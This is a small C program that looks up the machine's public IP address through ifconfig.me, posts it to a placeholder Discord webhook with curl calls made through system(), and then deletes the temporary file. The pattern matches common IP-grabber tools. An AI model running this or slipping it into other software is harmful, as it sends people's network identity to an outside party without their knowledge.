#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *filename = "ip.txt";
    const char *webhook_url = "https://discord.com/api/webhooks/your_webhook_here";

    int result = system("curl -s http://ifconfig.me > ip.txt");

    if (result != 0) {
        fprintf(stderr, "Error: curl command failed\n");
        return 1;
    }

    FILE *file = fopen(filename, "r");
    if (!file) {
        perror("fopen");
        return 1;
    }
    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    fclose(file);

    if (size == 0) {
        fprintf(stderr, "Error: IP file is empty\n");
        return 1;
    }

    char cmd[1024];
    #ifdef _WIN32
    snprintf(cmd, sizeof(cmd),
             "curl -s -X POST -F \"file=@%s\" \"%s\"",
             filename, webhook_url);
    #else
    snprintf(cmd, sizeof(cmd),
             "curl -s -X POST -F 'file=@%s' '%s'",
             filename, webhook_url);
    #endif

    int send_result = system(cmd);
    if (send_result != 0) {
        fprintf(stderr, "Error: curl webhook send failed\n");
        return 1;
    }

    remove(filename);

    printf("IP successfully sent to webhook and file deleted.\n");
    return 0;
}
